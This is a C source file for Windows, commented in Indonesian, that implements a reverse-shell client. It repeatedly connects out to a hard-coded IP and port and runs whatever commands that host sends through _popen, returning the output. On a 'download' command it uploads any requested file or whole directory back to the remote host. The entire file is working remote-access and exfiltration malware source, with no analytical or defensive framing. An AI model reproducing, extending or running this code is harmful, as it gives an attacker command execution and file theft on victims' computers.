#include "EstablishTCPConnection.h"
#include "TCPBlockTransRecv.h"
#include "SendFile.h"
#include "SendDir.h"
#include <stdio.h>
#include <stdlib.h>
#include <shlwapi.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <process.h>
#include <stdbool.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib") 

#define MAX_COMMAND     2048
#define SERVER_PORT     "8080"                    // Port penerima
#define SERVER_IP       "192.168.31.94"   // IP penerima (ubah sesuai kebutuhan)

// Fungsi untuk mengirim Current Path
void sendCurrentPath(SOCKET sock) {
    char cwd[1024] = { 0 };
    FILE* fp = _popen("cd", "r");
    if (fp == NULL) {
        return;
    }
    fgets(cwd, 1024, fp);
    _pclose(fp);
    cwd[strcspn(cwd, "\n")] = 0; // Remove newline character
    sendDataWithChecksum(sock, cwd, strlen(cwd) + 1);
}

void flushSocketBuffer(SOCKET sock) {
    u_long mode = 1;  // 1 = non-blocking mode
    if (ioctlsocket(sock, FIONBIO, &mode) != 0) {
        printf("Gagal mengatur socket ke mode non-blocking, error: %d\n", WSAGetLastError());
        return;
    }

    char tmpBuf[1024];
    int bytesRead;

    // Baca semua data yang tersisa pada buffer kernel
    while ((bytesRead = recv(sock, tmpBuf, sizeof(tmpBuf), 0)) > 0) {
        // Data dibaca dan diabaikan
    }

    if (bytesRead == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK) {  // WSAEWOULDBLOCK berarti tidak ada data lagi
            printf("Error saat membaca data socket, error: %d\n", err);
        }
    }

    // Kembalikan socket ke mode blocking (0 = blocking mode)
    mode = 0;
    if (ioctlsocket(sock, FIONBIO, &mode) != 0) {
        printf("Gagal mengembalikan socket ke mode blocking, error: %d\n", WSAGetLastError());
    }
}

void sendGetFileAttriError(SOCKET sock, const char* filename) {
    DWORD err = GetLastError();
    if (!err) return;

    LPSTR msgBuf = NULL;
    size_t msgSize = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&msgBuf, 0, NULL);

    if (msgSize && msgBuf) {
        const char* prefix = "System error : \"", * sep = "\" : ";
        size_t total = strlen(prefix) + strlen(filename) + strlen(sep) + msgSize + 1;
        char* combined = malloc(total);
        if (combined) {
            snprintf(combined, total, "%s%s%s%s", prefix, filename, sep, msgBuf);
            sendDataWithChecksum(sock, combined, strlen(combined) + 1);
            free(combined);
        }
        else
            sendDataWithChecksum(sock, "Error: Memory allocation failed.\n", 35);
    }
    else
        sendDataWithChecksum(sock, "Unknown error occurred.\n", 25);
    LocalFree(msgBuf);
}

int checkFileType(SOCKET sock, const char* path) {
    DWORD attributes = GetFileAttributesA(path);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        sendGetFileAttriError(sock, path);
        return -1;
    }

    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        sendDataWithChecksum(sock, "DIRECTORY", 10);
        return 0;
    }
    else {
        sendDataWithChecksum(sock, "FILE", 5);
        return 1;
    }
}

int main(int argc, char* argv[]) {
    system("chcp 65001");
    char command[MAX_COMMAND];
    char full_command[MAX_COMMAND + 10];
    char cwd[MAX_COMMAND];
    WSADATA wsaData;
    SOCKET socket1 = INVALID_SOCKET, socket2 = INVALID_SOCKET, socket3 = INVALID_SOCKET;
    struct addrinfo* result = NULL, hints;
    int iResult;

    // Inisialisasi Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup gagal: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char* receivedCommand = NULL;
    while (1) {
        if (receiveDataWithChecksum(socket1, &receivedCommand, FALSE) >= 0) {
            if (receivedCommand != NULL && strcmp(receivedCommand, "getcurrentpath") == 0)
                sendCurrentPath(socket2);
            // Check for exit command
            else  if (receivedCommand != NULL && strcmp(receivedCommand, "exit") == 0) {
                //break;
            }
            // Handle internal commands like 'cls'
            else if (receivedCommand != NULL && strcmp(receivedCommand, "cls") == 0) {
                //system("cls");
                //continue;
            }

            // **Tangani perintah "cd" secara manual**
            else if (receivedCommand != NULL && strncmp(receivedCommand, "cd ", 3) == 0) {
                char* path = receivedCommand + 3; // Ambil path setelah "cd "

                if (_chdir(path) != 0)
                    sendDataWithChecksum(socket2, "The system cannot find the path specified.\n", 45);
                else
                    sendDataWithChecksum(socket2, "", 1);
            }

            else if (receivedCommand != NULL && strncmp(receivedCommand, "download ", 9) == 0 && \
                (socket3 = establishTCPConnect(SERVER_IP, SERVER_PORT, 2)) != INVALID_SOCKET) {
                int fileType = checkFileType(socket3, receivedCommand + 9);
                if (fileType == 1) {                    //File
                    int sendFileResult = sendFile(socket3, receivedCommand + 9, PathFindFileNameA(receivedCommand + 9));
                    if (sendFileResult == -2) {
                        char message[265] = "Error: ";  // Inisialisasi dengan prefix "Error: "
                        // Tambahkan pesan error ke buffer, dimulai setelah "Error: "
                        strerror_s(message + strlen(message), sizeof(message) - strlen(message), errno);
                        strcat_s(message, sizeof(message), "\n");
                        sendDataWithChecksum(socket2, (unsigned char*)message, strlen(message) + 1);
                    }
                    else if (sendFileResult == -1)
                        sendDataWithChecksum(socket2, "Download Failed ... \n", 23);
                }
                else if (fileType == 0)                 //Directory
                    sendDir(socket1, socket2, socket3, SERVER_IP, SERVER_PORT, receivedCommand + 9, receivedCommand + 9);
            }

            else {
                // Execute command using popen
                unsigned char* temp = (unsigned char*)realloc(receivedCommand, strlen(receivedCommand) + 7);
                if (!temp) {
                    printf("Gagal memperbesar buffer.\n");
                    free(receivedCommand);
                    receivedCommand = NULL;
                    return 1;
                }
                receivedCommand = temp;
                memcpy(receivedCommand + strlen(receivedCommand), " 2>&1", 6);
                FILE* fp = _popen(receivedCommand, "r");
                if (fp == NULL) {
                    printf("Error executing command.\n");
                    continue;
                }

                size_t bufSize = 1024, totalLen = 0;
                char* output = malloc(bufSize);
                if (!output) {
                    _pclose(fp);
                    continue;
                }
                output[0] = '\0';

                char output_temp[2048];
                while (fgets(output_temp, sizeof(output_temp), fp)) {
                    size_t len = strlen(output_temp);
                    if (totalLen + len + 1 > bufSize) {
                        bufSize = (totalLen + len + 1) * 2;  // Perbesar buffer secara efisien
                        char* newOut = realloc(output, bufSize);
                        if (!newOut) {
                            free(output);
                            _pclose(fp);
                            continue;
                        }
                        output = newOut;
                    }
                    memcpy(output + totalLen, output_temp, len);
                    totalLen += len;
                    output[totalLen] = '\0';
                }

                _pclose(fp);
                printf("Sending : \n %s END", output);
                sendDataWithChecksum(socket2, (unsigned char*)output, totalLen + 1);
                free(output);
            }
        }
        else {
            // Resolusi alamat server (penerima)
            iResult = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);
            if (iResult != 0) {
                printf("getaddrinfo gagal: %d\n", iResult);
                WSACleanup();
                return 1;
            }

            // Buat socket untuk koneksi
            socket1 = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
            socket2 = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
            if (socket1 == INVALID_SOCKET || socket2 == INVALID_SOCKET) {
                printf("Error pada socket(): %ld\n", WSAGetLastError());
                freeaddrinfo(result);
                WSACleanup();
                return 1;
            }

            // Connect Sampai Berhasil
            while (1) {
                Sleep(5000);
                printf("Trying to connect .....\n");
                // Koneksi ke server (penerima) Socket1
                iResult = connect(socket1, result->ai_addr, (int)result->ai_addrlen);
                if (iResult == SOCKET_ERROR) {
                    printf("Tidak dapat terhubung ke server!\n");
                    continue;
                }

                // Koneksi ke server (penerima) Socket2
                iResult = connect(socket2, result->ai_addr, (int)result->ai_addrlen);
                if (iResult == SOCKET_ERROR) {
                    printf("Tidak dapat terhubung ke server!\n");
                    continue;
                }

                freeaddrinfo(result);
                printf("Connected !\n");
                break;
            }
        }
        free(receivedCommand);
        receivedCommand = NULL;
    }

    // Shutdown koneksi dan cleanup
    shutdown(socket1, SD_SEND);
    shutdown(socket2, SD_SEND);
    closesocket(socket1);
    closesocket(socket2);
    WSACleanup();

    return 0;
}
